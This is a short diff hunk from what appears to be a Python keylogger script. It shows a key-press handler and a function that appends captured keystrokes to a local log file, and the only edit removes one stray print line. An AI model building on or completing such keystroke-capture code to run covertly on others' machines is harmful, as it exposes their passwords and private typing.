@@ -21,7 +21,6 @@ def on_press(key):
 
 def write_file():
     with open("logs.txt", "a") as f:
-        print(self.log, file=f)
         for key in keys:
             k = str(key).replace("'","")
             if k.find("space") > 0:
